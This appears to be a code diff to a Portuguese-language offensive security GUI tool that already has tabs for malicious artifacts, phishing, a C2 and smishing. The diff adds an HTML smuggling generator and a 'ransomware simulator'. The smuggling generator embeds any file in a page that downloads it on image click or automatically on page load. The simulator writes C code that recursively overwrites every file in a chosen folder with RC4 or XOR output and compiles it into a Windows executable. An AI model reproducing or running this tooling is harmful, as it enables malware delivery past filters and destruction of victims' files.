@@ -13,6 +13,7 @@ import threading
 import socket
 
 
+
 class DarkThemeApp(QMainWindow):
     def __init__(self):
         super().__init__()
@@ -35,8 +36,8 @@ class DarkThemeApp(QMainWindow):
         self.apt_tab = QWidget()
         self.gsm_tab = QWidget()
         self.lnk_tab = QWidget()
-
-
+        self.htmlsm_tab = QWidget()
+        self.ransomware_tab = QWidget()
 
         self.tabs.addTab(self.artifacts_tab, "Gerar Artefatos Maliciosos")
         self.tabs.addTab(self.phishing_tab, "Phishing & Spear-Phishing")
@@ -44,6 +45,9 @@ class DarkThemeApp(QMainWindow):
         self.tabs.addTab(self.c2_tab, "C2 Simulado")
         self.tabs.addTab(self.gsm_tab, "Smishing e Vishing")
         self.tabs.addTab(self.apt_tab, "Templates APT")
+        self.tabs.addTab(self.htmlsm_tab, "HTML Smuggling")
+        self.tabs.addTab(self.ransomware_tab, "Simulador de Ransomware")
+
 
         # --- Aba Gerar Artefatos Maliciosos ---
         layout = QVBoxLayout()
@@ -355,6 +359,91 @@ class DarkThemeApp(QMainWindow):
         lnk_layout.addWidget(self.lnk_status)
 
         self.lnk_tab.setLayout(lnk_layout)
+
+        # --- Aba HTML Smuggling ---
+        self.htmlsm_tab = QWidget()
+        self.tabs.addTab(self.htmlsm_tab, "HTML Smuggling")
+
+        htmlsm_layout = QVBoxLayout()
+
+        htmlsm_layout.addWidget(QLabel("Selecionar Arquivo para Embutir (será convertido em Base64):"))
+        self.htmlsm_file_input = QLineEdit()
+        htmlsm_layout.addWidget(self.htmlsm_file_input)
+
+        self.htmlsm_browse_btn = QPushButton("Selecionar Arquivo")
+        self.htmlsm_browse_btn.clicked.connect(self.select_htmlsm_file)
+        htmlsm_layout.addWidget(self.htmlsm_browse_btn)
+
+        htmlsm_layout.addWidget(QLabel("URL da Imagem (opcional):"))
+        self.htmlsm_image_url = QLineEdit()
+        self.htmlsm_image_url.setPlaceholderText("https://exemplo.com/imagem.jpg")
+        htmlsm_layout.addWidget(self.htmlsm_image_url)
+
+        htmlsm_layout.addWidget(QLabel("Nome do Arquivo de Download:"))
+        self.htmlsm_output_filename = QLineEdit()
+        self.htmlsm_output_filename.setText("arquivo_malicioso.iso")
+        htmlsm_layout.addWidget(self.htmlsm_output_filename)
+
+        self.htmlsm_generate_btn = QPushButton("Gerar HTML Smuggling")
+        self.htmlsm_generate_btn.clicked.connect(self.generate_htmlsm)
+        htmlsm_layout.addWidget(self.htmlsm_generate_btn)
+
+        htmlsm_layout.addWidget(QLabel("Modo de Entrega:"))
+        self.htmlsm_mode_selector = QComboBox()
+        self.htmlsm_mode_selector.addItems(["Clique na Imagem", "Download Automático"])
+        htmlsm_layout.addWidget(self.htmlsm_mode_selector)
+
+        self.htmlsm_status = QLabel("Status: Aguardando ação...")
+        htmlsm_layout.addWidget(self.htmlsm_status)
+
+        self.htmlsm_open_btn = QPushButton("Abrir no Navegador")
+        self.htmlsm_open_btn.setEnabled(False)
+        self.htmlsm_open_btn.clicked.connect(self.open_htmlsm_in_browser)
+        htmlsm_layout.addWidget(self.htmlsm_open_btn)
+
+
+        self.htmlsm_tab.setLayout(htmlsm_layout)
+
+
+        # --- Aba Simulador de Ransomware ---
+        ransom_layout = QVBoxLayout()
+
+        ransom_layout.addWidget(QLabel("Nome do Ransomware:"))
+        self.ransomware_name_input = QLineEdit()
+        self.ransomware_name_input.setPlaceholderText("Ex: SimRansom")
+        ransom_layout.addWidget(self.ransomware_name_input)
+
+        ransom_layout.addWidget(QLabel("Chave AES-256 (texto livre, será convertida):"))
+        self.ransomware_key_input = QLineEdit()
+        self.ransomware_key_input.setPlaceholderText("Ex: minhaSuperChave123")
+        ransom_layout.addWidget(self.ransomware_key_input)
+
+        ransom_layout.addWidget(QLabel("IV (hexadecimal, 32 caracteres — opcional):"))
+        self.ransomware_iv_input = QLineEdit()
+        self.ransomware_iv_input.setPlaceholderText("Ex: a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6")
+        ransom_layout.addWidget(self.ransomware_iv_input)
+
+        ransom_layout.addWidget(QLabel("Cifra a ser usada:"))
+        self.ransomware_cipher_selector = QComboBox()
+        self.ransomware_cipher_selector.addItems(["RC4", "XOR"])
+        ransom_layout.addWidget(self.ransomware_cipher_selector)
+
+        ransom_layout.addWidget(QLabel("Sistema Operacional (compilação):"))
+        self.ransomware_os_selector = QComboBox()
+        self.ransomware_os_selector.addItems(["Windows"])  # futuros: Linux, macOS
+        ransom_layout.addWidget(self.ransomware_os_selector)
+
+        self.ransomware_generate_btn = QPushButton("Gerar Simulador de Ransomware")
+        self.ransomware_generate_btn.clicked.connect(self.generate_sim_ransomware)
+        ransom_layout.addWidget(self.ransomware_generate_btn)
+
+        # ⬅️ Label de status da ação
+        self.ransom_status = QLabel("Status: Aguardando ação...")
+        ransom_layout.addWidget(self.ransom_status)
+
+        self.ransomware_tab.setLayout(ransom_layout)
+
+
 
 
     def set_dark_theme(self):
@@ -1218,10 +1307,283 @@ End If
             self.lnk_output_dir.setText(folder_path)
 
 
+    def select_htmlsm_file(self):
+        path, _ = QFileDialog.getOpenFileName(self, "Selecionar Arquivo para HTML Smuggling", "", "Todos os Arquivos (*)")
+        if path:
+            self.htmlsm_file_input.setText(path)
+
+    def generate_htmlsm(self):
+        import base64
+        import os
+
+        file_path = self.htmlsm_file_input.text().strip()
+        image_url = self.htmlsm_image_url.text().strip() or "https://i.natgeofe.com/n/548467d8-c5f1-4551-9f58-6817a8d2c45e/NationalGeographic_2572187_square.jpg"
+        download_name = self.htmlsm_output_filename.text().strip()
+        mode = self.htmlsm_mode_selector.currentText()
+
+        if not os.path.exists(file_path):
+            QMessageBox.warning(self, "Erro", "Arquivo selecionado não encontrado.")
+            return
+
+        try:
+            with open(file_path, "rb") as f:
+                b64_data = base64.b64encode(f.read()).decode()
+
+            if mode == "Clique na Imagem":
+                html_template = f"""<!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <title>Click to Download</title>
+        <style>
+            body {{ font-family: Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }}
+            .container {{ text-align: center; }}
+            img {{ width: 200px; cursor: pointer; }}
+        </style>
+    </head>
+    <body>
+    <div class="container">
+        <h3>Click on the Image!</h3>
+        <img src="{image_url}" alt="Click to download" onclick="initiateDownload()" />
+    </div>
+    <script>
+    (function() {{
+        function b64ToBuf(b64) {{
+            var bin = atob(b64), len = bin.length, buf = new Uint8Array(len);
+            for (var i = 0; i < len; i++) buf[i] = bin.charCodeAt(i);
+            return buf;
+        }}
+        window.initiateDownload = function() {{
+            var data = `{b64_data}`;
+            var blobData = b64ToBuf(data);
+            var blob = new Blob([blobData], {{ type: 'application/octet-stream' }});
+            var link = document.createElement('a');
+            link.style.display = 'none';
+            document.body.appendChild(link);
+            var url = window.URL.createObjectURL(blob);
+            link.href = url;
+            link.download = '{download_name}';
+            link.click();
+            setTimeout(function() {{
+                window.URL.revokeObjectURL(url);
+                document.body.removeChild(link);
+            }}, 100);
+        }};
+    }})();
+    </script>
+    </body>
+    </html>"""
+            else:  # Download Automático
+                html_template = f"""<!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <title>Download Starting...</title>
+        <script>
+        (function() {{
+            function b64ToBuf(b64) {{
+                var bin = atob(b64), len = bin.length, buf = new Uint8Array(len);
+                for (var i = 0; i < len; i++) buf[i] = bin.charCodeAt(i);
+                return buf;
+            }}
+            window.onload = function() {{
+                var data = `{b64_data}`;
+                var blobData = b64ToBuf(data);
+                var blob = new Blob([blobData], {{ type: 'application/octet-stream' }});
+                var link = document.createElement('a');
+                link.style.display = 'none';
+                document.body.appendChild(link);
+                var url = window.URL.createObjectURL(blob);
+                link.href = url;
+                link.download = '{download_name}';
+                link.click();
+                setTimeout(function() {{
+                    window.URL.revokeObjectURL(url);
+                    document.body.removeChild(link);
+                }}, 100);
+            }};
+        }})();
+        </script>
+    </head>
+    <body>
+    <h3>Download Iniciando...</h3>
+    </body>
+    </html>"""
+
+            os.makedirs("outputs", exist_ok=True)
+            html_path = os.path.join("outputs", "html_smuggling.html")
+            with open(html_path, "w", encoding="utf-8") as f:
+                f.write(html_template)
+
+            self.htmlsm_status.setText(f"✅ HTML Smuggling gerado em: {html_path}")
+            QMessageBox.information(self, "Sucesso", f"HTML salvo como:\n{html_path}")
+            self.htmlsm_open_btn.setEnabled(True)
+            self.generated_html_path = html_path
+
+        except Exception as e:
+            self.htmlsm_status.setText(f"❌ Erro: {str(e)}")
+            QMessageBox.critical(self, "Erro", f"Erro ao gerar HTML:\n{str(e)}")
+
+
+    def open_htmlsm_in_browser(self):
+        import webbrowser
+        import os
+
+        if hasattr(self, "generated_html_path") and os.path.exists(self.generated_html_path):
+            try:
+                webbrowser.open_new_tab(f"file://{os.path.abspath(self.generated_html_path)}")
+            except Exception as e:
+                QMessageBox.critical(self, "Erro", f"Falha ao abrir no navegador:\n{str(e)}")
+        else:
+            QMessageBox.warning(self, "Erro", "Arquivo HTML não encontrado para abrir.")
+
+
+
+    def generate_sim_ransomware(self):
+        import os
+        import subprocess
+        from PySide2.QtWidgets import QMessageBox
+
+        name = self.ransomware_name_input.text().strip() or "SimRansom"
+        key_text = self.ransomware_key_input.text().strip()
+        cipher_type = self.ransomware_cipher_selector.currentText()
+
+        if not key_text:
+            QMessageBox.warning(self, "Erro", "Digite uma chave (ex: SegredoTop123).")
+            return
+
+        key = key_text.encode("utf-8")
+        key_len = len(key)
+        key_array = ', '.join(str(b) for b in key)
+
+        os.makedirs("sim_ransomware", exist_ok=True)
+
+        encryptor_path = f"sim_ransomware/{name}_encryptor.c"
+        decryptor_path = f"sim_ransomware/{name}_decryptor.c"
+        exe_path = f"sim_ransomware/{name}.exe"
+
+        if cipher_type == "RC4":
+            cipher_func = f"""
+    void rc4(unsigned char* data, int len, unsigned char* key, int klen) {{
+        unsigned char S[256];
+        for (int i = 0; i < 256; i++) S[i] = i;
+
+        int j = 0;
+        for (int i = 0; i < 256; i++) {{
+            j = (j + S[i] + key[i % klen]) % 256;
+            unsigned char tmp = S[i];
+            S[i] = S[j];
+            S[j] = tmp;
+        }}
+
+        int i = 0; j = 0;
+        for (int n = 0; n < len; n++) {{
+            i = (i + 1) % 256;
+            j = (j + S[i]) % 256;
+            unsigned char tmp = S[i];
+            S[i] = S[j];
+            S[j] = tmp;
+            data[n] ^= S[(S[i] + S[j]) % 256];
+        }}
+    }}
+    """
+            crypto_call = "rc4(buffer, len, key, key_len);"
+
+        else:  # XOR
+            cipher_func = f"""
+    void xor_cipher(unsigned char* data, int len, unsigned char* key, int klen) {{
+        for (int i = 0; i < len; i++) {{
+            data[i] ^= key[i % klen];
+        }}
+    }}
+    """
+            crypto_call = "xor_cipher(buffer, len, key, key_len);"
+
+        base_code = f'''#define _CRT_SECURE_NO_WARNINGS
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <string.h>
+    #include <dirent.h>
+    #include <sys/stat.h>
+
+    unsigned char key[] = {{{key_array}}};
+    int key_len = {key_len};
+
+    {cipher_func}
+
+    void process_file(const char* filepath) {{
+        FILE* f = fopen(filepath, "rb");
+        if (!f) return;
+        fseek(f, 0, SEEK_END);
+        long len = ftell(f);
+        rewind(f);
+
+        unsigned char* buffer = malloc(len);
+        fread(buffer, 1, len, f);
+        fclose(f);
+
+        {crypto_call}
+
+        FILE* out = fopen(filepath, "wb");
+        fwrite(buffer, 1, len, out);
+        fclose(out);
+        free(buffer);
+    }}
+
+    void walk(const char* path) {{
+        struct dirent* entry;
+        DIR* dp = opendir(path);
+        if (!dp) return;
+
+        while ((entry = readdir(dp))) {{
+            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
+            char fullpath[1024];
+            snprintf(fullpath, sizeof(fullpath), "%s/%s", path, entry->d_name);
+
+            struct stat st;
+            stat(fullpath, &st);
+            if (S_ISDIR(st.st_mode)) {{
+                walk(fullpath);
+            }} else {{
+                process_file(fullpath);
+            }}
+        }}
+        closedir(dp);
+    }}
+
+    int main(int argc, char* argv[]) {{
+        if (argc != 2) {{
+            printf("Uso: %s <pasta>\\n", argv[0]);
+            return 1;
+        }}
+        walk(argv[1]);
+        return 0;
+    }}
+    '''
+
+        with open(encryptor_path, "w") as f:
+            f.write(base_code)
+
+        with open(decryptor_path, "w") as f:
+            f.write("// Mesmo código do encryptor (criptografia simétrica)\n")
+            f.write(base_code)
+
+        compile_cmd = f"x86_64-w64-mingw32-gcc {encryptor_path} -o {exe_path}"
+        try:
+            result = subprocess.run(compile_cmd, shell=True, capture_output=True, text=True)
+            if result.returncode == 0:
+                QMessageBox.information(self, "Sucesso", f"✅ Simulador gerado: {exe_path}\n\nCifra: {cipher_type}\nChave usada: {key_text}")
+            else:
+                QMessageBox.critical(self, "Erro", f"Erro na compilação:\n{result.stderr}")
+        except Exception as e:
+            QMessageBox.critical(self, "Erro", f"Erro ao compilar:\n{str(e)}")
+
+
+
 import asyncio
 import edge_tts
 
-async def generate_cloned_voice(text, voice="en-US-GuyNeural", output_file="cloned_voice.mp3"):
+async def generate_cloned_voice(text, voice="en-US-GuyNeural", output_file="outputs/cloned_voice.mp3"):
     communicate = edge_tts.Communicate(text, voice)
     await communicate.save(output_file)
     return output_file
